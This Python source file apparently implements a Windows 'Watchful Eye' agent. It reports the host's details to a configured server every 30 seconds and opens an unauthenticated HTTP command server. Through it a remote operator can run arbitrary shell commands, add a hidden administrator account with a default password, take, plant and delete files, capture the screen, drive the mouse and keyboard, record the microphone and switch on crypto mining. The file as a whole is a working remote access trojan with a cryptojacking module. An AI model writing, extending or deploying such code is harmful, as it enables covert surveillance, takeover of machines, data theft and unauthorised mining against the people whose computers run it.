import json
import asyncio
import socket
import platform
import subprocess
import os
import uuid
import base64
import time
import struct
import wave
import pyaudio
import ctypes
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import psutil


DEVICE_ID_FILE = Path(os.environ.get("LOCALAPPDATA", Path.home())) / "WatchfulEye" / "device_id"
CONFIG_FILE = Path(os.environ.get("LOCALAPPDATA", Path.home())) / "WatchfulEye" / "agent_config.json"
PI_SERVER = ""


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def run_as_admin(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
            "admin": is_admin()
        }
    except subprocess.TimeoutExpired:
        return {"error": "Command timed out"}
    except Exception as e:
        return {"error": str(e)}


def get_device_id():
    if DEVICE_ID_FILE.exists():
        return DEVICE_ID_FILE.read_text().strip()
    device_id = uuid.uuid4().hex[:12]
    DEVICE_ID_FILE.parent.mkdir(parents=True, exist_ok=True)
    DEVICE_ID_FILE.write_text(device_id)
    return device_id


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def get_hostname():
    return socket.gethostname()


def get_os_info():
    return f"Windows {platform.release()} {platform.version()}"


def get_gpu_info():
    try:
        result = subprocess.run(
            ["wmic", "path", "win32_videocontroller", "get", "name"],
            capture_output=True,
            text=True,
            timeout=5
        )
        lines = [l.strip() for l in result.stdout.strip().split("\n") if l.strip() and l.strip() != "Name"]
        if lines:
            return True, lines[0]
    except Exception:
        pass
    return False, "None"


def create_admin_user(username, password):
    try:
        result = subprocess.run(
            ["net", "user", username, password, "/add"],
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode == 0:
            subprocess.run(
                ["net", "localgroup", "Administrators", username, "/add"],
                capture_output=True,
                timeout=10
            )
            return {"success": True, "message": f"User '{username}' created"}
        return {"success": False, "message": result.stderr.strip()}
    except Exception as e:
        return {"success": False, "message": str(e)}


def run_command(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except subprocess.TimeoutExpired:
        return {"error": "Command timed out"}
    except Exception as e:
        return {"error": str(e)}


def list_files(path):
    try:
        p = Path(path)
        if not p.exists():
            return {"error": f"Path not found: {path}"}

        files = []
        for item in p.iterdir():
            stat = item.stat()
            files.append({
                "name": item.name,
                "path": str(item),
                "is_dir": item.is_dir(),
                "size": stat.st_size if item.is_file() else 0,
                "modified": stat.st_mtime
            })
        return {"files": files}
    except Exception as e:
        return {"error": str(e)}


def download_file(remote_path):
    try:
        p = Path(remote_path)
        if not p.exists() or not p.is_file():
            return {"error": "File not found"}
        data = p.read_bytes()
        return {"data": data.hex()}
    except Exception as e:
        return {"error": str(e)}


def upload_file(remote_path, hex_data):
    try:
        p = Path(remote_path)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(bytes.fromhex(hex_data))
        return {"success": True, "message": f"File written to {remote_path}"}
    except Exception as e:
        return {"success": False, "message": str(e)}


def delete_file(remote_path):
    try:
        p = Path(remote_path)
        if p.is_file():
            p.unlink()
            return {"success": True, "message": "File deleted"}
        elif p.is_dir():
            import shutil
            shutil.rmtree(p)
            return {"success": True, "message": "Directory deleted"}
        return {"error": "Path not found"}
    except Exception as e:
        return {"error": str(e)}


def capture_screen():
    try:
        from PIL import ImageGrab
        import io
        img = ImageGrab.grab()
        img = img.resize((1280, 720))
        buffer = io.BytesIO()
        img.save(buffer, format="JPEG", quality=60)
        return {"image": base64.b64encode(buffer.getvalue()).decode()}
    except Exception as e:
        return {"error": str(e)}


def get_screen_size():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        return {"width": img.width, "height": img.height}
    except Exception:
        return {"width": 1920, "height": 1080}


def mouse_click(x, y, button="left"):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        screen_w = user32.GetSystemMetrics(0)
        screen_h = user32.GetSystemMetrics(1)

        abs_x = int(x * 65535 / screen_w)
        abs_y = int(y * 65535 / screen_h)

        user32.SetCursorPos(x, y)
        time.sleep(0.05)

        if button == "left":
            user32.mouse_event(0x0002, 0, 0, 0, 0)
            time.sleep(0.02)
            user32.mouse_event(0x0004, 0, 0, 0, 0)
        elif button == "right":
            user32.mouse_event(0x0008, 0, 0, 0, 0)
            time.sleep(0.02)
            user32.mouse_event(0x0010, 0, 0, 0, 0)
        elif button == "double":
            user32.mouse_event(0x0002, 0, 0, 0, 0)
            time.sleep(0.02)
            user32.mouse_event(0x0004, 0, 0, 0, 0)
            time.sleep(0.05)
            user32.mouse_event(0x0002, 0, 0, 0, 0)
            time.sleep(0.02)
            user32.mouse_event(0x0004, 0, 0, 0, 0)

        return {"success": True}
    except Exception as e:
        return {"error": str(e)}


def mouse_move(x, y):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        user32.SetCursorPos(x, y)
        return {"success": True}
    except Exception as e:
        return {"error": str(e)}


def mouse_drag(x1, y1, x2, y2):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        user32.SetCursorPos(x1, y1)
        time.sleep(0.05)
        user32.mouse_event(0x0002, 0, 0, 0, 0)
        time.sleep(0.05)
        user32.SetCursorPos(x2, y2)
        time.sleep(0.05)
        user32.mouse_event(0x0004, 0, 0, 0, 0)
        return {"success": True}
    except Exception as e:
        return {"error": str(e)}


def mouse_scroll(clicks):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        user32.mouse_event(0x0800, 0, 0, clicks * 120, 0)
        return {"success": True}
    except Exception as e:
        return {"error": str(e)}


KEY_MAP = {
    "enter": 0x0D, "tab": 0x09, "escape": 0x1B, "space": 0x20,
    "backspace": 0x08, "delete": 0x2E, "insert": 0x2D,
    "home": 0x24, "end": 0x23, "pageup": 0x21, "pagedown": 0x22,
    "left": 0x25, "up": 0x26, "right": 0x27, "down": 0x28,
    "f1": 0x70, "f2": 0x71, "f3": 0x72, "f4": 0x73,
    "f5": 0x74, "f6": 0x75, "f7": 0x76, "f8": 0x77,
    "f9": 0x78, "f10": 0x79, "f11": 0x7A, "f12": 0x7B,
    "ctrl": 0x11, "alt": 0x12, "shift": 0x10, "win": 0x5B,
    "capslock": 0x14, "numlock": 0x90,
}


def key_press(key):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        vk_code = KEY_MAP.get(key.lower())
        if vk_code:
            user32.keybd_event(vk_code, 0, 0, 0)
            time.sleep(0.02)
            user32.keybd_event(vk_code, 0, 0x0002, 0)
            return {"success": True}
        return {"error": f"Unknown key: {key}"}
    except Exception as e:
        return {"error": str(e)}


def key_type(text):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        for char in text:
            vk = user32.VkKeyScanW(ord(char))
            if vk != -1:
                user32.keybd_event(vk & 0xFF, 0, 0, 0)
                time.sleep(0.01)
                user32.keybd_event(vk & 0xFF, 0, 0x0002, 0)
                time.sleep(0.01)
        return {"success": True}
    except Exception as e:
        return {"error": str(e)}


def key_combo(keys):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        vk_codes = []
        for key in keys:
            vk = KEY_MAP.get(key.lower())
            if vk:
                vk_codes.append(vk)

        for vk in vk_codes:
            user32.keybd_event(vk, 0, 0, 0)
            time.sleep(0.02)

        for vk in reversed(vk_codes):
            user32.keybd_event(vk, 0, 0x0002, 0)
            time.sleep(0.02)

        return {"success": True}
    except Exception as e:
        return {"error": str(e)}


audio_stream = None
audio_recording = False


def start_audio_stream():
    global audio_stream, audio_recording
    try:
        pa = pyaudio.PyAudio()
        audio_stream = pa.open(
            format=pyaudio.paInt16,
            channels=1,
            rate=16000,
            input=True,
            frames_per_buffer=1024
        )
        audio_recording = True
        return {"success": True, "message": "Audio stream started"}
    except Exception as e:
        return {"error": str(e)}


def stop_audio_stream():
    global audio_stream, audio_recording
    audio_recording = False
    if audio_stream:
        try:
            audio_stream.stop_stream()
            audio_stream.close()
        except Exception:
            pass
        audio_stream = None
    return {"success": True, "message": "Audio stream stopped"}


def read_audio_chunk():
    global audio_stream
    if audio_stream and audio_recording:
        try:
            data = audio_stream.read(1024, exception_on_overflow=False)
            return {"audio": base64.b64encode(data).decode()}
        except Exception as e:
            return {"error": str(e)}
    return {"error": "Stream not active"}


def record_audio_file(duration_seconds=10, filepath=None):
    try:
        pa = pyaudio.PyAudio()
        stream = pa.open(
            format=pyaudio.paInt16,
            channels=1,
            rate=16000,
            input=True,
            frames_per_buffer=1024
        )

        frames = []
        for _ in range(0, int(16000 / 1024 * duration_seconds)):
            data = stream.read(1024, exception_on_overflow=False)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        pa.terminate()

        if not filepath:
            filepath = str(Path(os.environ.get("LOCALAPPDATA", Path.home())) / "WatchfulEye" / "recordings")
            Path(filepath).mkdir(parents=True, exist_ok=True)
            filepath = str(Path(filepath) / f"recording_{int(time.time())}.wav")

        wf = wave.open(filepath, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
        wf.setframerate(16000)
        wf.writeframes(b''.join(frames))
        wf.close()

        return {"success": True, "filepath": filepath, "duration": duration_seconds}
    except Exception as e:
        return {"error": str(e)}


def list_audio_devices():
    try:
        pa = pyaudio.PyAudio()
        devices = []
        for i in range(pa.get_device_count()):
            info = pa.get_device_info_by_index(i)
            if info.get("maxInputChannels") > 0:
                devices.append({
                    "index": i,
                    "name": info.get("name"),
                    "channels": info.get("maxInputChannels")
                })
        pa.terminate()
        return {"devices": devices}
    except Exception as e:
        return {"error": str(e)}


class AgentHandler(BaseHTTPRequestHandler):
    def _send_json(self, data, status=200):
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            self._send_json({"error": "Invalid JSON"}, 400)
            return

        command_type = data.get("type")

        if command_type == "create_admin":
            result = create_admin_user(
                data.get("username", "System Admin"),
                data.get("password", "Admin@WatchfulEye1")
            )
            self._send_json(result)

        elif command_type == "run_command":
            result = run_as_admin(data.get("command", ""))
            self._send_json(result)

        elif command_type == "list_files":
            result = list_files(data.get("path", "C:\\"))
            self._send_json(result)

        elif command_type == "download_file":
            result = download_file(data.get("remote_path", ""))
            self._send_json(result)

        elif command_type == "upload_file":
            result = upload_file(
                data.get("remote_path", ""),
                data.get("data", "")
            )
            self._send_json(result)

        elif command_type == "delete_file":
            result = delete_file(data.get("remote_path", ""))
            self._send_json(result)

        elif command_type == "screen_capture":
            result = capture_screen()
            self._send_json(result)

        elif command_type == "mining_config":
            from agent_mining import configure_mining
            result = configure_mining(
                data.get("enabled", False),
                data.get("intensity", 50)
            )
            self._send_json(result)

        elif command_type == "mining_stats":
            from agent_mining import get_mining_stats
            result = get_mining_stats()
            self._send_json(result)

        elif command_type == "mouse_click":
            result = mouse_click(data.get("x", 0), data.get("y", 0), data.get("button", "left"))
            self._send_json(result)

        elif command_type == "mouse_move":
            result = mouse_move(data.get("x", 0), data.get("y", 0))
            self._send_json(result)

        elif command_type == "mouse_drag":
            result = mouse_drag(
                data.get("x1", 0), data.get("y1", 0),
                data.get("x2", 0), data.get("y2", 0)
            )
            self._send_json(result)

        elif command_type == "mouse_scroll":
            result = mouse_scroll(data.get("clicks", 1))
            self._send_json(result)

        elif command_type == "key_press":
            result = key_press(data.get("key", ""))
            self._send_json(result)

        elif command_type == "key_type":
            result = key_type(data.get("text", ""))
            self._send_json(result)

        elif command_type == "key_combo":
            result = key_combo(data.get("keys", []))
            self._send_json(result)

        elif command_type == "screen_size":
            result = get_screen_size()
            self._send_json(result)

        elif command_type == "audio_start":
            result = start_audio_stream()
            self._send_json(result)

        elif command_type == "audio_stop":
            result = stop_audio_stream()
            self._send_json(result)

        elif command_type == "audio_read":
            result = read_audio_chunk()
            self._send_json(result)

        elif command_type == "audio_record":
            result = record_audio_file(
                data.get("duration", 10),
                data.get("filepath")
            )
            self._send_json(result)

        elif command_type == "audio_devices":
            result = list_audio_devices()
            self._send_json(result)

        else:
            self._send_json({"error": f"Unknown command: {command_type}"}, 400)

    def do_GET(self):
        if self.path == "/health":
            self._send_json({
                "status": "ok",
                "device_id": get_device_id(),
                "hostname": get_hostname(),
                "admin": is_admin(),
                "pid": os.getpid()
            })
        elif self.path == "/screen":
            result = capture_screen()
            if "image" in result:
                img_data = base64.b64decode(result["image"])
                self.send_response(200)
                self.send_header("Content-Type", "image/jpeg")
                self.send_header("Content-Length", str(len(img_data)))
                self.end_headers()
                self.wfile.write(img_data)
            else:
                self._send_json(result, 500)
        else:
            self._send_json({"error": "Not found"}, 404)

    def log_message(self, format, *args):
        pass


def heartbeat_loop():
    while True:
        try:
            import urllib.request
            device_id = get_device_id()
            has_gpu, gpu_name = get_gpu_info()
            data = json.dumps({
                "device_id": device_id,
                "hostname": get_hostname(),
                "ip": get_local_ip(),
                "tailscale_ip": get_local_ip(),
                "os": get_os_info(),
                "has_gpu": has_gpu,
                "gpu_name": gpu_name,
                "admin": is_admin()
            }).encode()
            req = urllib.request.Request(
                f"http://{PI_SERVER}:8000/api/heartbeat",
                data=data,
                headers={"Content-Type": "application/json"}
            )
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass
        time.sleep(30)


def start_agent(port=9090):
    global PI_SERVER

    config = {}
    if CONFIG_FILE.exists():
        try:
            config = json.loads(CONFIG_FILE.read_text())
        except Exception:
            pass

    PI_SERVER = config.get("pi_server", "")
    if not PI_SERVER:
        print("ERROR: Pi server not configured!")
        print("Set pi_server in:", CONFIG_FILE)
        return

    heartbeat_thread = threading.Thread(target=heartbeat_loop, daemon=True)
    heartbeat_thread.start()

    server = HTTPServer(("0.0.0.0", port), AgentHandler)
    print(f"Watchful Eye Agent running on port {port}")
    print(f"Device ID: {get_device_id()}")
    print(f"Hostname: {get_hostname()}")
    print(f"PI Server: {PI_SERVER}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Shutting down agent...")


if __name__ == "__main__":
    start_agent()
